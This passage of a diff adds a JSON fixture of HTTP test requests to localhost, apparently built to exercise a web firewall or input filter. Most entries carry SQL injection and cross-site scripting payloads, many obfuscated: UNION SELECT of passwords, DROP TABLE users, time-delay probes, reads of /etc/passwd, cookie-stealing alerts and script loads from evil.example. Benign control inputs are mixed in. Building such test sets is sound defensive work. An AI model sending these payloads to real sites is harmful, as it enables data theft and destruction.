+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "51"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"kitap\"}, \"tags\": [\"a\", \"kitap\"]}"
+  },
+  {
+    "name": "injection variant 308 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "209"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"\\\\78 \\\\27  AND \\\\31  = CONV\\\\45 RT (\\\\69 nt,\\\\40 \\\\40 \\\\76 \\\\65 rs\\\\69 on\\\\29 -\\\\2d \"}, \"tags\": [\"a\", \"\\\\78 \\\\27  AND \\\\31  = CONV\\\\45 RT (\\\\69 nt,\\\\40 \\\\40 \\\\76 \\\\65 rs\\\\69 on\\\\29 -\\\\2d \"]}"
+  },
+  {
+    "name": "injection variant 309 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "36"
+      ]
+    ],
+    "body": "comment=p%5Cu0072ice%3A%2010-20&ok=1"
+  },
+  {
+    "name": "injection variant 310 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Cif%5C72%20a%5C6d%20e%20src%5C3d%20%5C6a%20avascript%3Aalert%281%29%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 311 (arg name)",
+    "method": "GET",
+    "uri": "/item?%3Ca%20%20href%3D%22javascript%3Aconfirm%281%29%22%3Ex%3C%2Fa%3E=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 312 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "103"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"{\\\"$ne\\\"\\\\3a  \\\\6e \\\\75 \\\\6c l}\"}, \"tags\": [\"a\", \"{\\\"$ne\\\"\\\\3a  \\\\6e \\\\75 \\\\6c l}\"]}"
+  },
+  {
+    "name": "injection variant 313 (path)",
+    "method": "GET",
+    "uri": "/page/kitap",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 314 (query)",
+    "method": "GET",
+    "uri": "/item?id=JAVaSCRipt%3AAleRt%28DOCumEnT.cookIE%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 315 (query)",
+    "method": "GET",
+    "uri": "/item?id=x%27%20AND%201%3DCONVERT%28int%2C%40%40version%29--",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 316 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%27%20A%5C116%5Cx44%20extrac%5C164%5Cx76%5C141lue%5Cx28%5Cu0031%2Cconca%5Cx74%28%5C60%5Cu00787e%2C%5C166e%5C162sio%5C156%5Cu0028%5Cu0029%29%5C51%5Cu002d-",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 317 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=<div style=\"width:expression(alert(1))\">"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 318 (arg name)",
+    "method": "GET",
+    "uri": "/item?%2522%253E%253Cscript%253Efetch%2528%2527%252F%252Fx%2527%2529%253C%252Fscript%253E=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 319 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "22"
+      ]
+    ],
+    "body": "comment=1%2B1%3D2&ok=1"
+  },
+  {
+    "name": "injection variant 320 (path)",
+    "method": "GET",
+    "uri": "/page/select%2F%2Ax%2A%2Fload%26%23x5f%3Bfile%28%27%2Fetc%26%2347%3Bpasswd%26%2339%26%23x29%3B",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 321 (path)",
+    "method": "GET",
+    "uri": "/page/kitap",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 322 (query)",
+    "method": "GET",
+    "uri": "/item?id=%5C3c%20%5C64%20iv%5C20%20sty%5C6c%20e%5C3d%20%22%5C77%20idt%5C68%20%3A%5C65%20xpression%28a%5C6c%20er%5C74%20%281%29%29%22%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 323 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=<body onload = eval (atob ('YQ =  = '))>"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 324 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=<svg onload=alert(1)>"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 325 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%20%20OR%20%20pg_sleep%285%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 326 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "1 AnD bencHMarK(1000000,md5(1))"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 327 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref='||(SELECT 1 FROM dual)||'"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 328 (query)",
+    "method": "GET",
+    "uri": "/item?id=%27%3B%20DROP%20TABLE%20users--",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 329 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "<script>alert(1)</script>"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 330 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=<script>alert(1)</script>"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 331 (query)",
+    "method": "GET",
+    "uri": "/item?id=%27%3Balert%28String.fromCharCode%2888%29%29%2F%26%2347%3B",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 332 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "43"
+      ]
+    ],
+    "body": "comment=It%2527s%25205%2520o%2527clock&ok=1"
+  },
+  {
+    "name": "injection variant 333 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "52"
+      ]
+    ],
+    "body": "comment=javascript%3Aalert%28document.cookie%29&ok=1"
+  },
+  {
+    "name": "injection variant 334 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "157"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"1%20uniOn%20SeLect%20UserName%2c%20PASSWOrd%20from%20USeRS\"}, \"tags\": [\"a\", \"1%20uniOn%20SeLect%20UserName%2c%20PASSWOrd%20from%20USeRS\"]}"
+  },
+  {
+    "name": "injection variant 335 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "83"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"'; DROP TABLE users--\"}, \"tags\": [\"a\", \"'; DROP TABLE users--\"]}"
+  },
+  {
+    "name": "injection variant 336 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "' OR 1 = 1#"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 337 (arg name)",
+    "method": "GET",
+    "uri": "/item?admin%27--=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 338 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=1' OR '1' = '1"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 339 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%20AND%20BENCHMARK%281000000%2CMD5%281%29%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 340 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "'; DROP TABLE users--"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 341 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "53"
+      ]
+    ],
+    "body": "comment=1%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27&ok=1"
+  },
+  {
+    "name": "injection variant 342 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "22"
+      ]
+    ],
+    "body": "comment=O%27Brien&ok=1"
+  },
+  {
+    "name": "injection variant 343 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "129"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"1 UNION SELECT username, password FROM users\"}, \"tags\": [\"a\", \"1 UNION SELECT username, password FROM users\"]}"
+  },
+  {
+    "name": "injection variant 344 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "53"
+      ]
+    ],
+    "body": "comment=1%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27&ok=1"
+  },
+  {
+    "name": "injection variant 345 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "29"
+      ]
+    ],
+    "body": "comment=pRICe%3A%2010-20&ok=1"
+  },
+  {
+    "name": "injection variant 346 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%5Cx20%5C101%5Cx4eD%5C40%5Cx42EN%5C103HM%5Cu0041RK%5Cu00281000000%2CMD%5C65%281%29%5C51",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 347 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "61"
+      ]
+    ],
+    "body": "comment=%27%7C%7C%28SELECT%0A1%0AFROM%0Adual%29%7C%7C%27&ok=1"
+  },
+  {
+    "name": "injection variant 348 (query)",
+    "method": "GET",
+    "uri": "/item?id=%2522%253E%253Cscript%253Efetch%2528%2527%252F%252Fx%2527%2529%253C%252Fscript%253E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 349 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "\\x64\\u0072\\157p\\u0020me a \\x6c\\151n\\x65"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 350 (path)",
+    "method": "GET",
+    "uri": "/page/1e1union%2520select",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 351 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=1 AND SLEEP(5)"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 352 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3C%21--%5Bif%20gte%20IE%204%5D%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3C%21%5Bendif%5D--%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 353 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "13"
+      ]
+    ],
+    "body": "comment=&ok=1"
+  },
+  {
+    "name": "injection variant 354 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "41"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"\"}, \"tags\": [\"a\", \"\"]}"
+  },
+  {
+    "name": "injection variant 355 (query)",
+    "method": "GET",
+    "uri": "/item?id=1e1%5Cu0075n%5Cx69on%20%5C163elec%5C164",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 356 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3C%5C73%20crip%5C74%20%20src%3D%2F%2Fev%5C69%20l%5C2e%20exa%5C6d%20%5C70%20le%5C2f%20x.%5C6a%20s%5C3e%20%5C3c%20%2F%5C73%20c%5C72%20%5C69%20pt%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 357 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=javascript:alert(document.cookie)"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 358 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Ciframe%20src%3Djavascript%3Aalert%26%2340%3B1%26%2341%3B%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 359 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "46"
+      ]
+    ],
+    "body": "comment=%3CSVg%20onlOaD%3DALeRt%281%29%3E&ok=1"
+  },
+  {
+    "name": "injection variant 360 (query)",
+    "method": "GET",
+    "uri": "/item?id=select%5Cx20a%20%5C143%5Cx6flour",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 361 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%3B%20waITfo%5C52%20%20deLA%5C59%20%20%5C27%200%5C3a%200%3A5%5C27%20",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 362 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "56"
+      ]
+    ],
+    "body": "comment=%3Csvg%2F%2Ax%2A%2Fonload%3Dalert%281%29%3E&ok=1"
+  },
+  {
+    "name": "injection variant 363 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "52"
+      ]
+    ],
+    "body": "comment=javascript%3Aalert%28document.cookie%29&ok=1"
+  },
+  {
+    "name": "injection variant 364 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Cdiv%20style%20%3D%20%22width%3Aexpression%20%28alert%20%281%29%29%22%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 365 (path)",
+    "method": "GET",
+    "uri": "/page/O%27Brien",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 366 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "37"
+      ]
+    ],
+    "body": "comment=1%20OR%20pg_sleep%285%29&ok=1"
+  },
+  {
+    "name": "injection variant 367 (query)",
+    "method": "GET",
+    "uri": "/item?id=select%20load_file%28%27%2Fetc%2Fpasswd%27%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 368 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "23"
+      ]
+    ],
+    "body": "comment=2026-10-11&ok=1"
+  },
+  {
+    "name": "injection variant 369 (query)",
+    "method": "GET",
+    "uri": "/item?id=setTimeout%20%26%23x28%3Balert%26%2344%3B1%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 370 (arg name)",
+    "method": "GET",
+    "uri": "/item?1%20aND%20BENChMaRk%281000000%2CMd5%281%29%29=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 371 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 372 (query)",
+    "method": "GET",
+    "uri": "/item?id=select%20load_file%28%27%2Fetc%2Fpasswd%27%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 373 (arg name)",
+    "method": "GET",
+    "uri": "/item?%3C%21--%5Bif%20gte%20IE%204%5D%3E%3Cscript%3Ealert%20%281%29%3C%2Fscript%3E%3C%21%5Bendif%5D--%3E=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 374 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref='\\3b  \\44 ROP T\\41 BLE users--"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 375 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "54"
+      ]
+    ],
+    "body": "comment=1%5Cu0020OR%20pg_s%5Cu006ceep%5Cu00285%29&ok=1"
+  },
+  {
+    "name": "injection variant 376 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "61"
+      ]
+    ],
+    "body": "comment=%27%7C%7C%28SELECT%201%20FROM%20dual%29%7C%7C%27&ok=1"
+  },
+  {
+    "name": "injection variant 377 (arg name)",
+    "method": "GET",
+    "uri": "/item?%27%20UNION%20ALL%20SELECT%20NULL%2CNULL--=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 378 (query)",
+    "method": "GET",
+    "uri": "/item?id=%26lt%3Bscript%20src%20%3D%20%2F%26%23x2f%3Bevil.example%2Fx%26%2346js%26%2362%3B%26lt%3B%2Fscript%26%2362%3B",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 379 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%5C57%2A%2A%5Cu002fO%5Cu0052%2F%2A%5Cu002a%5C57%5Cx31%5Cx3d%5Cu0031",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 380 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "57"
+      ]
+    ],
+    "body": "comment=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E&ok=1"
+  },
+  {
+    "name": "injection variant 381 (query)",
+    "method": "GET",
+    "uri": "/item?id=javascript%3Aalert%20%28document.cookie%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 382 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "31"
+      ]
+    ],
+    "body": "comment=user%40example.com&ok=1"
+  },
+  {
+    "name": "injection variant 383 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
